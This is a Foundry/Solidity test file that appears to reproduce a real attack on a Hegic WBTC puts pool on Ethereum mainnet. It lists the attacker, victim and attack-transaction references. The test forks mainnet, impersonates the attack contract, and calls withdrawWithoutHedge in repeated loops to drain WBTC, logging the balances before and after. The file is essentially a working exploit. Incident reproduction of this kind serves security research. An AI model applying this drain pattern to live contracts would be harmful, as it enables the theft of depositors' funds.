// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~104M
// Attacker : https://etherscan.io/address/0x4B53608fF0cE42cDF9Cf01D7d024C2c9ea1aA2e8
// Attack Contract : https://etherscan.io/address/0xF51E888616a123875EAf7AFd4417fbc4111750f7
// Vulnerable Contract : https://etherscan.io/address/0x7094E706E75E13D1E0ea237f71A7C4511e9d270B
// Attack Tx 1: 0x260d5eb9151c565efda80466de2e7eee9c6bd4973d54ff68c8e045a26f62ea73
// Attack Tx 2: 0x444854ee7e7570f146b64aa8a557ede82f326232e793873f0bbd04275fa7e54c


// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x7094E706E75E13D1E0ea237f71A7C4511e9d270B#code

// @Analysis
// Post-mortem : 
// Twitter Guy : 
pragma solidity ^0.8.0;

contract HegicOptions is Test {
    uint256 blocknumToForkFrom1 = 21912408;
    uint256 blocknumToForkFrom2 = 21912423;
    address constant victim_contract_address = 0x7094E706E75E13D1E0ea237f71A7C4511e9d270B;
    address constant attacker_address = 0xF51E888616a123875EAf7AFd4417fbc4111750f7;
    address constant wbtc_address = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    IHegic_WBTC_ATM_Puts_Pool Hegic_WBTC_ATM_Puts_Pool;
    IERC20 WBTC;

    function setUp() public {
        WBTC = IERC20(wbtc_address);
        Hegic_WBTC_ATM_Puts_Pool = IHegic_WBTC_ATM_Puts_Pool(victim_contract_address);
    }

    function testExploit() public {
        // The attacker initially deposited 0.0025 WBTC into the victim contract. 
        // Tx: 0x9c27d45c1daa943ce0b92a70ba5efa6ab34409b14b568146d2853c1ddaf14f82

        vm.startPrank(attacker_address, attacker_address);
        
        // Attack Tx 1
        vm.createSelectFork("mainnet", blocknumToForkFrom1);
        emit log_named_decimal_uint("[Begin] Attacker WBTC before Tx1", WBTC.balanceOf(attacker_address), 8);
        for (uint256 i = 0; i < 100; i++){
            Hegic_WBTC_ATM_Puts_Pool.withdrawWithoutHedge(2);
        }
        emit log_named_decimal_uint("[End] Attacker WBTC after Tx1", WBTC.balanceOf(attacker_address), 8);

        // Between tx1 and tx2, the attacker had already withdraw the stolen WBTC from the attack contract. 
        // Tx: 0x722f67f6f9536fa6bbf4af447250e84b8b9270b66195059c9904a0e249543e80
        
        // Attack Tx 2
        vm.createSelectFork("mainnet", blocknumToForkFrom2);
        emit log_named_decimal_uint("[Begin] Attacker WBTC before Tx2", WBTC.balanceOf(attacker_address), 8);
        for (uint256 i = 0; i < 331; i++){
            Hegic_WBTC_ATM_Puts_Pool.withdrawWithoutHedge(2);
        }
        emit log_named_decimal_uint("[End] Attacker WBTC after Tx2", WBTC.balanceOf(attacker_address), 8);
        
        vm.stopPrank();
    }
}

interface IHegic_WBTC_ATM_Puts_Pool {
    function withdrawWithoutHedge(uint256 trancheID) external returns (uint256 amount);
}
